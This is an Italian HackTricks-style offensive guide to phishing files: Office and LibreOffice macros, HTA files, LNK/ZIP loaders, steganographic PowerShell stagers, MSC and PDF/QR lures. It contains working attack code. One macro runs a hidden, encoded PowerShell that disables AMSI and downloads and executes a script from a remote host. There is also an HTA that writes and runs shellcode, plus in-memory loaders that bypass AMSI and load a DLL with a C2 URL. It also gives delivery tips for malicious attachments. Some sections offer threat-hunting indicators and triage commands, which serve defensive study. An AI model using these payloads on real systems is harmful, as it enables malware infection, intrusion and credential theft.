# File e documenti di phishing

{{#include ../../banners/hacktricks-training.md}}

## Documenti Office

Microsoft Word esegue la convalida dei dati del file prima di aprirlo. La convalida dei dati viene effettuata identificando la struttura dei dati in base allo standard OfficeOpenXML. Se si verifica un errore durante l'identificazione della struttura dei dati, il file analizzato non verrà aperto.

Di solito, i file Word che contengono macro usano l'estensione `.docm`. Tuttavia, è possibile rinominare il file modificandone l'estensione e mantenere comunque la capacità di eseguire macro.\
Ad esempio, un file RTF non supporta le macro per sua progettazione, ma un file DOCM rinominato in RTF verrà gestito da Microsoft Word e potrà eseguire macro.\
Gli stessi meccanismi e funzionamenti interni si applicano a tutti i software della suite Microsoft Office (Excel, PowerPoint ecc.).

Puoi usare il seguente comando per verificare quali estensioni verranno eseguite da alcuni programmi Office:

```bash
assoc | findstr /i "word excel powerp"
```

I file DOCX che fanno riferimento a un template remoto (File –Options –Add-ins –Manage: Templates –Go) che include macro possono anche “eseguire” macro.

### Caricamento di immagini esterne

Vai a: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture e **Filename or URL**:_ http://<ip>/whatever

![Documenti Office - Caricamento di immagini esterne: vai a: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor con macro

È possibile usare le macro per eseguire codice arbitrario dal documento.

#### Funzioni di caricamento automatico

Più sono comuni, più è probabile che l’AV le rilevi.

- AutoOpen()
- Document_Open()

#### Esempi di codice per macro

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Rimuovere manualmente i metadati

Vai a **File > Info > Inspect Document > Inspect Document** per aprire Document Inspector. Fai clic su **Inspect**, quindi su **Remove All** accanto a **Document Properties and Personal Information**.

#### Estensione del documento

Al termine, seleziona il menu a discesa **Save as type** e cambia il formato da **`.docx`** a Word 97-2003 **`.doc`**.\
Fallo perché **non puoi salvare macro in un file `.docx`** e l'estensione **`.docm`**, che abilita le macro, ha una **cattiva reputazione** (ad esempio, l'icona della miniatura mostra un enorme `!` e alcuni gateway web/email la bloccano del tutto). Pertanto, la **vecchia estensione `.doc` è il miglior compromesso**.

#### Generatori di macro malevole

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macro ad avvio automatico in LibreOffice ODT (Basic)

I documenti di LibreOffice Writer possono incorporare macro Basic ed eseguirle automaticamente all'apertura del file associando la macro all'evento **Open Document** (Strumenti → Personalizza → Eventi → Open Document → Macro…).<sup>[[1]](#references)</sup> Una semplice macro reverse shell è simile a questa:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Nota le virgolette doppie (`""`) all'interno della stringa: LibreOffice Basic le usa per rappresentare le virgolette letterali, quindi i payload che terminano con `...==""")` mantengono bilanciati sia il comando interno sia l'argomento di Shell.

Suggerimenti per la consegna:

- Salva il file come `.odt` e associa la macro all'evento del documento affinché venga eseguita immediatamente all'apertura.
- Quando invii un'email con `swaks`, usa `--attach @resume.odt` (`@` è necessario affinché venga inviato il contenuto del file, non la stringa del nome file, come allegato). Questo è fondamentale quando si abusano server SMTP che accettano destinatari `RCPT TO` arbitrari senza convalida.

## File HTA

Un HTA è un programma Windows che **combina HTML e linguaggi di scripting (come VBScript e JScript)**. Genera l'interfaccia utente e viene eseguito come un'applicazione «completamente attendibile», senza i vincoli del modello di sicurezza di un browser.

Un HTA viene eseguito usando **`mshta.exe`**, che in genere viene **installato** insieme a **Internet Explorer**, quindi `mshta` dipende da IE. Se IE è stato disinstallato, gli HTA non potranno essere eseguiti.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Forzare l'autenticazione NTLM

Esistono diversi modi per **forzare l'autenticazione NTLM "da remoto"**; per esempio, si possono aggiungere **immagini invisibili** alle email o a pagine HTML che l'utente visiterà (anche tramite HTTP MitM?). Oppure si può inviare alla vittima l'**indirizzo di file** che **inneschino** un'**autenticazione** semplicemente **aprendo la cartella**.

**Consulta queste idee e altre ancora nelle pagine seguenti:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Non dimenticare che non puoi solo sottrarre l'hash o l'autenticazione, ma anche **eseguire attacchi NTLM relay**:

- [**Attacchi NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay verso i certificati)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + payload incorporati in ZIP (catena fileless)

Le campagne molto efficaci distribuiscono un file ZIP contenente due documenti esca legittimi (PDF/DOCX) e un file .lnk malevolo. Il trucco consiste nel memorizzare il loader PowerShell effettivo nei byte grezzi del file ZIP, dopo un marker univoco; il file .lnk lo estrae e lo esegue interamente in memoria.<sup>[[2]](#references)</sup>

Flusso tipico implementato dalla one-liner PowerShell del file .lnk:

1) Individua il file ZIP originale nei percorsi comuni: Desktop, Downloads, Documents, %TEMP%, %ProgramData% e nella directory genitore della directory di lavoro corrente.
2) Legge i byte del file ZIP e cerca un marker predefinito (ad es., xFIQCV). Tutto ciò che segue il marker è il payload PowerShell incorporato.
3) Copia il file ZIP in %ProgramData%, lo estrae lì e apre il file esca .docx per sembrare legittimo.
4) Bypassa AMSI per il processo corrente: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deoffusca lo stage successivo (ad es., rimuove tutti i caratteri #) e lo esegue in memoria.

Esempio di struttura PowerShell per estrarre ed eseguire lo stage incorporato:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Note
- La distribuzione spesso sfrutta sottodomini PaaS affidabili (ad es., *.herokuapp.com) e può filtrare i payload (distribuendo ZIP innocui in base a IP/UA).
- Lo stage successivo spesso decritta shellcode base64/XOR e la esegue tramite Reflection.Emit + VirtualAlloc per ridurre al minimo gli artefatti su disco.

Persistence utilizzata nella stessa catena
- Hijacking di COM TypeLib del controllo Microsoft Web Browser, così che IE/Explorer o qualsiasi app che lo incorpora rilanci automaticamente il payload.<sup>[[2]](#references)[[4]](#references)</sup> Vedi qui i dettagli e i comandi pronti all'uso:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Ricerca/IOC
- File ZIP contenenti la stringa marker ASCII (ad es., xFIQCV) aggiunta ai dati dell'archivio.
- File .lnk che enumerano le cartelle principali/dell'utente per individuare lo ZIP e aprire un documento esca.
- Manomissione di AMSI tramite [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Thread di lavoro prolungati che terminano con link ospitati su domini PaaS affidabili.

## Staging con esca LNK iniziale → persistence tramite attività pianificata → side-loading di CPL attendibile

Un altro schema ricorrente è un **`.lnk` che si spaccia per un documento** e apre subito un'esca innocua mentre prepara la vera catena in background.<sup>[[3]](#references)</sup>

Flusso osservato:
1. Il collegamento **si spaccia per un PDF** e usa `conhost.exe` o un proxy simile per avviare un downloader PowerShell offuscato.
2. PowerShell frammenta i token più evidenti (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), così i rilevamenti semplicistici che cercano `iwr`, `gci`, `ren`, `cpi` o `schtasks` non individuano il comando.
3. Lo stager scarica **prima il documento esca**, lo apre per la vittima e poi ricostruisce i file malevoli in background.
4. I payload possono essere scritti con **estensioni fittizie** e poi rinominati rimuovendo i caratteri riempitivi, ritardando la comparsa di artefatti `.exe` / `.cpl` evidenti.
5. La persistence viene stabilita con un'**attività pianificata con frequenza al minuto** che avvia un binario host attendibile da un percorso scrivibile dall'utente.

Indizi minimi per la ricerca di questo schema:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Un layout di staging utile da riconoscere è:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` o `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Perché il secondo stage è furtivo

Nel case study di Rapid7, il task pianificato avviava ripetutamente **`Fondue.exe`** da `C:\Users\Public\`. Poiché **`APPWIZ.cpl`** era stato posizionato nella stessa cartella ed esportava **`RunFODW`**, il binario Microsoft attendibile caricava tramite side-loading il CPL dell'attaccante invece della copia di sistema legittima.

Il CPL quindi:
- Legge un blob **AES-256-CBC** da `C:\Windows\Tasks\editor.dat`
- Lo decritta tramite **Windows CNG / `bcrypt.dll`**
- Alloca memoria eseguibile e vi copia lo shellcode decrittato
- Lo esegue indirettamente passando il puntatore allo shellcode come callback di **`EnumUILanguagesW`**

Quest'ultimo passaggio merita di essere cercato separatamente: spesso il malware evita un salto diretto `((void(*)())buf)()` e abusa invece di una **WinAPI legittima che accetta una callback** per trasferire l'esecuzione.

Il payload decrittato in questa campagna era shellcode **Donut**, che poi mappava interamente in memoria il PE finale e applicava patch a **AMSI/WLDP/ETW** nel processo corrente prima di cedere l'esecuzione. Per approfondire il side-loading e le operazioni post-exploitation eseguite in memoria, vedi:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Punti di ricerca pratici:
- File `.lnk` che avviano `powershell.exe` o `conhost.exe`, seguiti dalla visualizzazione di un documento esca.
- Download di breve durata in **`C:\Users\Public\`**, seguiti dalla rinomina immediata da estensioni senza senso.
- Task pianificati con nomi generici come `GoogleErrorReport` che vengono eseguiti da **directory scrivibili dagli utenti**.
- Binari attendibili che caricano file **`.cpl` / `.dll`** dalla stessa directory non di sistema.
- Blob di testo Base64 scritti in **`C:\Windows\Tasks\`** e poi letti dal modulo caricato tramite side-loading.

## Payload delimitati tramite steganografia nelle immagini (stager PowerShell)

Le catene di loader recenti distribuiscono JavaScript/VBS offuscato che decodifica e avvia uno stager PowerShell Base64. Lo stager scarica un'immagine (spesso GIF) che contiene una DLL .NET codificata in Base64 e nascosta come testo semplice tra marcatori univoci di inizio/fine. Lo script cerca questi delimitatori (esempi osservati in natura: «<<sudo_png>> … <<sudo_odt>>>»), estrae il testo compreso tra i marcatori, lo decodifica da Base64 in byte, carica l'assembly in memoria e invoca un metodo di ingresso noto passandogli l'URL C2.<sup>[[5]](#references)</sup>

Flusso di lavoro
- Stage 1: Dropper JS/VBS archiviato → decodifica il Base64 incorporato → avvia lo stager PowerShell con -nop -w hidden -ep bypass.
- Stage 2: Lo stager PowerShell → scarica l'immagine, estrae il Base64 delimitato dai marcatori, carica la DLL .NET in memoria e chiama il suo metodo (ad es. VAI) passandogli l'URL C2 e le opzioni.
- Stage 3: Il loader recupera il payload finale e in genere lo inietta tramite process hollowing in un binario attendibile (comunemente MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Scopri di più sul process hollowing e sul proxy execution tramite utility attendibili qui:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Esempio PowerShell per estrarre una DLL da un'immagine e invocare in memoria un metodo .NET:

<details>
<summary>Estrattore e loader di payload stego PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Note
- Si tratta di ATT&CK T1027.003 (steganografia/nascondimento dei marker).<sup>[[6]](#references)</sup> I marker variano da una campagna all’altra.
- Il bypass di AMSI/ETW e il deoffuscamento delle stringhe vengono comunemente applicati prima di caricare l’assembly.
- Threat hunting: analizzare le immagini scaricate alla ricerca di delimitatori noti; identificare PowerShell che accede alle immagini e decodifica immediatamente blob Base64.

Vedi anche gli strumenti di steganografia e le tecniche di carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → staging di PowerShell tramite Base64

Una fase iniziale ricorrente è un file `.js` o `.vbs` piccolo e pesantemente offuscato, distribuito all’interno di un archivio. Il suo unico scopo è decodificare una stringa Base64 incorporata e avviare PowerShell con `-nop -w hidden -ep bypass` per predisporre la fase successiva tramite HTTPS.<sup>[[5]](#references)</sup>

Logica schematica (astratta):
- Leggere il contenuto del proprio file
- Individuare un blob Base64 tra stringhe di riempimento
- Decodificare in PowerShell ASCII
- Eseguire tramite `wscript.exe`/`cscript.exe` invocando `powershell.exe`

Indicatori per il threat hunting
- Allegati JS/VBS archiviati che avviano `powershell.exe` con `-enc`/`FromBase64String` nella riga di comando.
- `wscript.exe` che avvia `powershell.exe -nop -w hidden` da percorsi temporanei dell’utente.

## Documenti MSC come contenitori di esecuzione (GrimResource)

I file Microsoft Management Console (`.msc`) sono definizioni di console XML normalmente aperte da `mmc.exe`. **GrimResource** arma un riferimento `StringTable` a una risorsa `apds.dll` che contiene una vecchia primitiva XSS, facendo sì che l’apertura della console appositamente creata da parte di un utente esegua JavaScript all’interno di `mmc.exe`. I campioni osservati combinavano l’offuscamento basato su `transformNode` con **DotNetToJScript** per istanziare un payload .NET senza ricorrere al consueto percorso delle macro di Office.<sup>[[9]](#references)</sup>

Per il triage statico, tratta un MSC non attendibile come testo e **non** farci doppio clic:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

I pivot runtime ad alto segnale includono `mmc.exe` che carica il CLR o componenti di scripting, crea connessioni di rete oppure avvia `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` o un eseguibile inatteso. Il formato è legittimo, quindi i rilevamenti dovrebbero correlare **origine + contenuto XML/script sospetto + comportamento di `mmc.exe`** invece di bloccare ogni MSC.<sup>[[9]](#references)</sup>

## Reindirizzatori PDF/QR e controllo della distribuzione del payload

Un PDF non ha bisogno di un exploit per essere utile. Campagne recenti inseriscono un **codice QR o un normale link** in un documento dall’aspetto innocuo, spostano la sessione del browser al di fuori dei controlli della posta e personalizzano la destinazione con l’indirizzo del destinatario. Microsoft ha documentato PDF del 2025 con URL QR univoci per ogni destinatario, che conducevano a un’infrastruttura di furto di credenziali RaccoonO365; una catena parallela usava il filtraggio basato su IP/ambiente per restituire un percorso JavaScript/MSI a visitatori selezionati, ma un PDF innocuo a scanner o client non autorizzati.<sup>[[10]](#references)</sup>

Esamina sia le azioni dei PDF sia i codici QR renderizzati. Un QR può essere disegnato come vettore anziché archiviato come immagine estraibile, quindi rasterizza ogni pagina oltre a estrarre le immagini incorporate:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Esamina le destinazioni decodificate e i redirect da un sistema di analisi isolato, senza autenticarti. Tra gli indicatori utili per la ricerca ci sono PDF contenenti solo QR code con email quasi vuote, l’indirizzo email del destinatario incorporato in un parametro di query, diversi redirect attraverso servizi di hosting affidabili e contenuti diversi in base a IP, geolocalizzazione, cookie, referrer o user agent. Confronta le richieste usando profili controllati, perché una singola richiesta dal sandbox potrebbe ricevere solo l’esca.<sup>[[10]](#references)</sup>

## File Windows per sottrarre hash NTLM

Consulta la pagina sui **luoghi in cui sottrarre credenziali NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – macro di LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campagna ZipLine: un sofisticato attacco di phishing contro aziende statunitensi](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: tracciamento delle tattiche di Dropping Elephant attraverso una catena di loader a tema cinese](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nuova tecnica di persistenza COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Il loader PhantomVAI distribuisce diversi infostealer](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografia (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console per l’accesso iniziale e l’elusione](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Gli attori delle minacce sfruttano la stagione fiscale per distribuire campagne di phishing a tema fiscale](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
